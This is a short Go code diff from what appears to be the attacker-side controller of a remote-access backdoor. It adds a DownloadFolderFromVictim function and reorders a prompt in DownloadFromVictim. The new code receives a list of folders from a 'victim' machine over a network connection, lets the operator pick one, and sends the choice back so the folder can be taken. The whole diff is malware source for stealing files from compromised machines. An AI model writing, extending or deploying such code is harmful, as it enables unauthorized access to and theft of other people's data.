@@ -29,8 +29,8 @@ func DownloadFromVictim(connection net.Conn) (err error) {
 		fmt.Println("\t", index, "\t", fileName)
 	}
 
-	fmt.Print("[+] select file: ")
 	reader := bufio.NewReader(os.Stdin)
+	fmt.Print("[+] select file: ")
 
 	user_input_raw, err := reader.ReadString('\n')
 
@@ -57,5 +57,27 @@ func DownloadFromVictim(connection net.Conn) (err error) {
 }
 
 func DownloadFolderFromVictim(connection net.Conn) (err error) {
+	fileStruct := &FilesList{}
+	dec := gob.NewDecoder(connection)
+	err = dec.Decode(fileStruct)
+
+	for index, folderName := range fileStruct.Files {
+		fmt.Println("\t", index, "\t", folderName)
+	}
+
+	reader := bufio.NewReader(os.Stdin)
+	fmt.Print("[+] select folder: ")
+
+	user_input_raw, err := reader.ReadString('\n')
+
+	user_input := strings.TrimSuffix(user_input_raw, "\n")
+
+	folder_index, _ := strconv.Atoi(user_input)
+
+	FolderName := fileStruct.Files[folder_index]
+
+	nbyte, err := connection.Write([]byte(FolderName + "\n"))
+	fmt.Println("[+] File name sent :", nbyte)
+
 	return
 }
